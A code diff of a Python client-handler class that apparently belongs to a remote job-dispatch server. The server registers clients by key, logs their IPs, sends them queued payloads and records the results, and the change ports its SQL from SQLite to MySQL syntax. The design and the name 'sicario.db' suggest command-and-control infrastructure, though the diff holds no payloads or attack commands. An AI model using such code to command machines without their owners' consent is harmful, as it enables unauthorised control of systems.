@@ -21,8 +21,8 @@ class Client:
 
 		if self.pending_job: # server is currently waiting for the results of sent command
 			response = command
-			db = database.Database({'filename':'db/sicario.db'})
-			db.cursor.execute('''UPDATE jobs SET processed = 1, result = ?, executed_on = datetime('now') WHERE id = ?''', [command, self.pending_job])
+			db = database.Database()
+			db.cursor.execute('''UPDATE jobs SET processed = 1, result = %s WHERE id = %s''', [command, self.pending_job])
 			db.handler.commit()
 			db.handler.close()
 
@@ -41,7 +41,7 @@ class Client:
 			self.disconnect()
 			return False
 
-		db = database.Database({'filename':'db/sicario.db'})
+		db = database.Database()
 		
 		if not self.key:
 			# is it new member? let's check if he provided his key
@@ -53,7 +53,7 @@ class Client:
 				self.send_command(['set','key',key])
 				
 				# now, we should add this to a database
-				db.cursor.execute('''INSERT INTO clients (hash, ip, last_active) VALUES (?,?,datetime('now', 'localtime'))''', [key, self.address])
+				db.cursor.execute('''INSERT INTO clients (userkey, ip, created_on, updated_on) VALUES (%s, %s, NOW(), NOW())''', [key, self.address])
 
 				db.handler.commit()
 				db.handler.close()
@@ -65,15 +65,16 @@ class Client:
 				self.key = arguments[1]
 
 				# first we check if our client is registered in the database, if not - we inform him about it
-				db.cursor.execute('SELECT * FROM clients WHERE hash=?', [self.key])
+				db.cursor.execute('SELECT * FROM clients WHERE userkey=%s', [self.key])
 				client = db.cursor.fetchone()
 
 				if not client:
 					self.send_command(['error', '1'])
 					db.handler.close()
 					self.disconnect()
+					return False
 
-				db.cursor.execute('''UPDATE clients SET last_active = datetime('now', 'localtime'), ip = ? WHERE hash=?''', [self.address, self.key])
+				db.cursor.execute('''UPDATE clients SET updated_on = NOW(), ip = %s WHERE userkey=%s''', [self.address, self.key])
 
 				# now we're going to check for pending commands (jobs)
 				jobs = self.__check_jobs()
@@ -99,16 +100,16 @@ class Client:
 		if not self.key:
 			return False
 
-		db = database.Database({'filename':'db/sicario.db'})
-		db.cursor.execute('''SELECT * FROM jobs WHERE client_key = ? AND processed = 0''', [self.key])
+		db = database.Database()
+		db.cursor.execute('''SELECT * FROM jobs WHERE userkey = %s AND processed = 0''', [self.key])
 		jobs = db.cursor.fetchall()
 		db.handler.close()
 
 		if not jobs:
 			return False
 
-		self.send_command([jobs[0][2], jobs[0][4]]) #payload
-		self.pending_job = jobs[0][0] #id
+		self.send_command([jobs[0]['type'], jobs[0]['payload']]) #payload
+		self.pending_job = jobs[0]['id'] #id
 
 		return jobs
 
